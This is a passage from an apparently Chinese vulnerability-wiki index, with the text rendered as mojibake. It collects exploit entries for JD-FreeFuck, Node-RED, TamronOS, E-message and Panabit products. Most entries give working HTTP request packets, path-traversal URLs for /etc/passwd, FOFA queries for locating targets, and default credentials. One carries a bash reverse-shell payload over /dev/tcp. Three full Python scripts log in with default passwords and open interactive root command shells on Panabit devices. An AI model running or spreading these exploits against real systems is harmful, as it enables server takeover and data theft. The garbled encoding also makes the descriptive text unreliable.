å‚æ‰§è¡Œå‘½ä»¤æ—¶æ²¡æœ‰å¯¹å†…å®¹è¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæ§åˆ¶æœåŠ¡å™¨ é¡¹ç›®åœ°å€ï¼š https://github.com/meselson/JD-FreeFuck æ¼æ´å½±å“ [!NOTE] JD-FreeFuck FOFA [!NOTE] title=\"äº¬ä¸œè–…ç¾Šæ¯›æ§åˆ¶é¢æ¿\" æ¼æ´å¤ç° è®¿é—®åç™»å½•é¡µé¢å¦‚ä¸‹ é»˜è®¤è´¦å·å¯†ç ä¸º useradmin/supermanito å‘é€å¦‚ä¸‹è¯·æ±‚åŒ…æ‰§è¡Œå‘½ä»¤ POST /runCmd HTTP/1.1 Host: 101.200.189.251:5678 Content-Length: 50 Pragma: no-cache Cache-Control: no-cache Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U Connection: close cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500 å…¶ä¸­ cmd å‚æ•°å­˜åœ¨å‘½ä»¤æ³¨å…¥ åå¼¹shell cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now&delay=500 å‚è€ƒæ–‡ç«  @æ¡ƒèŠ±å¿ƒ å¸ˆå‚… https://www.secquan.org/Discuss/1071932#reply3 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Node-RED/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Node-RED/","title":"Node-RED","keywords":"","body":"PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-07-01 18:53:44 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Node-RED/Node-RED ui_base ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Node-RED/Node-RED ui_base ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"Node-RED ui_base ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"Node-RED ui_base ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° Node-RED åœ¨/nodes/ui_base.jsä¸­ï¼ŒURLä¸'/ui_base/js/*'åŒ¹é…ï¼Œç„¶åä¼ é€’ç»™path.joinï¼Œ ç¼ºä¹å¯¹æœ€ç»ˆè·¯å¾„çš„éªŒè¯ä¼šå¯¼è‡´è·¯å¾„éå†æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ•°æ®ï¼Œæ¯”å¦‚settings.js æ¼æ´å½±å“ [!NOTE] Node-RED FOFA [!NOTE] title=\"Node-RED\" æ¼æ´å¤ç° è®¿é—®é¡µé¢ éªŒè¯POC /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd /ui_base/js/..%2f..%2f..%2f..%2fsettings.js PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-07-04 17:10:46 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TamronOS/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TamronOS/","title":"TamronOS","keywords":"","body":"TamronOS TamronOS IPTVç³»ç»Ÿ ping ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ TamronOS IPTVç³»ç»Ÿ submit ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-15 14:51:22 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TamronOS/TamronOS IPTVç³»ç»Ÿ submit ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TamronOS/TamronOS IPTVç³»ç»Ÿ submit ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´.html","title":"TamronOS IPTVç³»ç»Ÿ submit ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´","keywords":"","body":"TamronOS IPTVç³»ç»Ÿ submit ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ æ¼æ´æè¿° TamronOS IPTVç³»ç»Ÿ /api/manager/submit å­˜åœ¨ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥ä»»æ„ç”¨æˆ·åˆ›å»ºè¿›å…¥åå° æ¼æ´å½±å“ [!NOTE] TamronOS IPTVç³»ç»Ÿ FOFA [!NOTE] app=\"TamronOS-IPTVç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´POCä¸º /api/manager/submit?group=1&username=test&password=123456 user: test pass: 123456 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-15 15:29:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TamronOS/TamronOS IPTVç³»ç»Ÿ ping ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TamronOS/TamronOS IPTVç³»ç»Ÿ ping ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"TamronOS IPTVç³»ç»Ÿ ping ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"TamronOS IPTVç³»ç»Ÿ ping ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° TamronOS IPTVç³»ç»Ÿ api/ping å­˜åœ¨ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] TamronOS IPTVç³»ç»Ÿ FOFA [!NOTE] app=\"TamronOS-IPTVç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´POCä¸º /api/ping?count=5&host=;id; PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-15 14:53:44 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/E-message/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/E-message/","title":"E-message","keywords":"","body":"E-message E-message è¶Šæƒè®¿é—®æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-29 17:03:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/E-message/E-message è¶Šæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/E-message/E-message è¶Šæƒè®¿é—®æ¼æ´.html","title":"E-message è¶Šæƒè®¿é—®æ¼æ´","keywords":"","body":"E-message è¶Šæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° E-message å­˜åœ¨è¶Šæƒè®¿é—®æ¼æ´ï¼Œç”±äºé…ç½®é¡µé¢æ²¡æœ‰åšæƒé™è®¾å®šï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è®¿é—®å¹¶é‡ç½®è´¦å·å¯†ç ç­‰æ“ä½œ æ¼æ´å½±å“ [!NOTE] E-message FOFA [!NOTE] title=\"emessage è®¾ç½®: æ•°æ®åº“è®¾ç½® - æ ‡å‡†è¿æ¥\" æ¼æ´å¤ç° è®¿é—®å®‰è£…é¡µé¢ http://xxx.xxx.xxx.xxx/setup/setup-datasource-standard.jsp å¯ä»¥è·å–è´¦å·å¯†ç ä¿¡æ¯ï¼Œä¸€è·¯ç‚¹å‡»å³ä¸‹è§’çš„ç»§ç»­å°†ä¼šè·³è½¬ä¿®æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç é¡µé¢ï¼Œä¿®æ”¹åç™»å½•å³å¯è·å–åå°æƒé™ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Panabit/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Panabit/","title":"Panabit","keywords":"","body":"Panabit Panabit iXCache cfg_cmd åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ Panabit Panalog cmdhandle.php åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-29 22:09:55 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Panabit/Panabit iXCache cfg_cmd åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Panabit/Panabit iXCache cfg_cmd åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Panabit iXCache cfg_cmd åå°å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Panabit iXCache ajax_cmd åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Panabit iXCache åå° ixeyeæŒ‡ä»¤è¾“å…¥æ—¶å­˜åœ¨å‘½ä»¤æ‹¼æ¥æ¼æ´ï¼Œå°†ä¼šä»¥Rootæƒé™æ‰§è¡Œä»»æ„ä»£ç  æ¼æ´å½±å“ [!NOTE] Panabit iXCache FOFA [!NOTE] \"iXCache\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ é»˜è®¤è´¦å·å¯†ç ä¸ºï¼šadmin/ixcache è¿›å…¥åå°åç‚¹å‡»å‘½ä»¤è¡Œï¼Œè®¿é—®Url /cgi-bin/Maintain/cfg_cmd è¾“å…¥å‘½ä»¤æ—¶ä½¿ç”¨ ; å³å¯å‘½ä»¤æ‹¼æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ è¯·æ±‚åŒ…ä¸º POST /cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;cat%20/etc/passwd HTTP/1.1 Host: Connection: close Content-Length: 0 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: */* X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: _walkthrough-introduction=0; pauser_1615540522_368691=paonline_admin_73708_16196903931;Path=/ æ¼æ´POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : Panabit iXCache cfg_cmd åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login/userverify.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"username=admin&password=ixcache\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/login/userverify.cgi.... \\033[0m\".format(target_url)) if '/cgi-bin/monitor.cgi' in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨é»˜è®¤å£ä»¤ admin/ixcache \\033[0m\".format(target_url)) cookie = response.headers['Set-Cookie'] print(\"\\033[36m[o] è·å–Cookie : {} \\033[0m\".format(cookie)) POC_2(target_url, cookie) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;cat%20/etc/passwd\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"_walkthrough-introduction=0;{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æ‰§è¡Œ cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[36m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_3(target_url, Cmd, Cookie) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_3(target_url, Cmd, Cookie): Cmd = Cmd.replace(\" \", \"%20\") vuln_url = target_url + \"/cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;{}\".format(Cmd) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"_walkthrough-introduction=0;{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Panabit/Panabit Panalog cmdhandle.php åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Panabit/Panabit Panalog cmdhandle.php åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"PPanabit Panalog cmdhandle.php åå°å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Panabit Panalog cmdhandle.php åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Panabit Panalog cmdhandle.php å­˜åœ¨åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ç™»å½•åæ‰§è¡Œä»»æ„å‘½ä»¤æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] Panabit Panalog FOFA [!NOTE] \"Panalog\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ é»˜è®¤è´¦å·å¯†ç ä¸ºï¼šadmin/panabit å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º Maintain/command-html.phpï¼Œ è¯·æ±‚åŒ…å¦‚ä¸‹ POST /Maintain/cmdhandle.php HTTP/1.1 Host: Connection: close Content-Length: 31 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: */* X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: cloud_limit=20; cloud_left=block; PHPSESSID=9lpglosgab794j5ouvv0sg7q73 cmd=cat%2520%252Fetc%252Fpasswd æ¼æ´POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : Panabit Panalog cmdhandle.php åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" cookie = \"PHPSESSID=111111111111111111111peiqi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": cookie } data = \"user=admin&mypass=panabit&sec=1619123700835.617&useldap=0\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/login.php.... \\033[0m\".format(target_url)) if \"yes\" in response.text and \"yn\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨é»˜è®¤å£ä»¤ admin/panabit \\033[0m\".format(target_url)) print(\"\\033[36m[o] è®¾ç½®Cookie : {} \\033[0m\".format(cookie)) POC_2(target_url, cookie) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/Maintain/cmdhandle.php\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } data = \"cmd=cat /etc/passwd\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url,data=data, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æ‰§è¡Œ cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[36m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_3(target_url, Cmd, Cookie) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_3(target_url, Cmd, Cookie): Cmd = Cmd.replace(\" \", \"%20\") vuln_url = target_url + \"/Maintain/cmdhandle.php\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } data = \"cmd={}\".format(Cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data,headers=headers, verify=False, timeout=5) response_data = response.text.replace(\"\", \"\\n\") print(\"\\033[36m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response_data)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-21 11:19:04 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Panabit/Panabit æ™ºèƒ½åº”ç”¨ç½‘å…³ ajax_top åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Panabit/Panabit æ™ºèƒ½åº”ç”¨ç½‘å…³ ajax_top åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Panabit æ™ºèƒ½åº”ç”¨ç½‘å…³ ajax_top åå°å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Panabit æ™ºèƒ½åº”ç”¨ç½‘å…³ ajax_top åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Panabit æ™ºèƒ½åº”ç”¨ç½‘å…³ ajax_top åå°å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä»¥rootæƒé™è¿è¡Œéƒ¨åˆ†å±é™©å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] Panabit æ™ºèƒ½åº”ç”¨ç½‘å…³ FOFA [!NOTE] cert=\"panabit.com\" && body=\"/login/login.js\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ é»˜è®¤è´¦å·å¯†ç ä¸ºï¼šadmin/panabit å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º /cgi-bin/Maintain/ajax_topï¼Œ è¯·æ±‚åŒ…å¦‚ä¸‹ POST /cgi-bin/Maintain/ajax_top?action=runcmd&cmd=ls HTTP/1.1 Host: Connection: close Content-Length: 0 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Cache-Control: no-cache Accept-Language: zh-CN,zh;q=0.8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/html; charset=GB2312 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Cookie: pauser_1618744108=paonline_admin_9328_16197064781_c4229a3a492c76e334f57728abced88b|443|; æ¼æ´POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : Panabit æ™ºèƒ½åº”ç”¨ç½‘å…³ ajax_top åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login/userverify.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"action=user_login&palang=ch&username=admin&password=722289d072731e2cc73038aa9ad9e067&code=\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/login/userverify.cgi.... \\033[0m\".format(target_url)) if \"Auth_OK\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨é»˜è®¤å£ä»¤ admin/panabit \\033[0m\".format(target_url)) cookie = response.headers['Set-Cookie'] print(\"\\033[36m[o] è·å–Cookie : {} \\033[0m\".format(cookie)) POC_2(target_url, cookie) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/cgi-bin/Maintain/ajax_top?action=runcmd&cmd=cat /etc/passwd\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æ‰§è¡Œ cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[36m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_3(target_url, Cmd, Cookie) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_3(target_url, Cmd, Cookie): vuln_url = target_url + \"/cgi-bin/Maintain/ajax_top?action=runcmd&cmd={}\".format(Cmd) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url ,headers=headers, verify=False, timeout=5) response_data = response.text.replace(\"\", \"\\n\") print(\"\\033[36m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response_data)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/","title":"TerraMaster","keywords":"","body":"TerraMaster TerraMaster TOS RCE CVE-2020-28188 TerraMaster TOS ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-28187 TerraMaster TOS ä»»æ„è´¦å·å¯†ç ä¿®æ”¹æ¼æ´ CVE-2020-28186 TerraMaster TOS ç”¨æˆ·æšä¸¾æ¼æ´ CVE-2020-28185 TerraMaster TOS exportUser.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-01 19:36:40 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/TerraMaster TOS ç”¨æˆ·æšä¸¾æ¼æ´ CVE-2020-28185.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/TerraMaster TOS ç”¨æˆ·æšä¸¾æ¼æ´ CVE-2020-28185.html","title":"TerraMaster TOS ç”¨æˆ·æšä¸¾æ¼æ´ CVE-2020-28185","keywords":"","body":"TerraMaster TOS ç”¨æˆ·æšä¸¾æ¼æ´ CVE-2020-28185 æ¼æ´æè¿° TerraMaster TOS å­˜åœ¨ç”¨æˆ·æšä¸¾æ¼æ´ï¼Œé€šè¿‡wizard/initialise.phpé¡µé¢çš„usernameå‚æ•°å³å¯æšä¸¾ç³»ç»Ÿä¸­çš„ç”¨æˆ·ï¼Œä»¥åŠæ³„éœ²é‚®ç®±ä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" æ¼æ´å¤ç° æ¼æ´ç‚¹æ¥æºäºæ‰¾å›å¯†ç çš„ç”¨æˆ·å­˜åœ¨æ ¡éªŒ è¾“å…¥ç”¨æˆ·å admin ç‚¹å‡»ç¡®å®šï¼ŒæŸ¥çœ‹Burpæ•è·çš„åŒ… å…¶ä¸­æœ‰ä¸€ä¸ªè¯·æ±‚åŒ…ç”¨äºç¡®è®¤ç”¨æˆ·adminæ˜¯å¦å­˜åœ¨ å­˜åœ¨åˆ™è¿”å›ç”¨æˆ·çš„é‚®ç®±ä¿¡æ¯ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/TerraMaster TOS 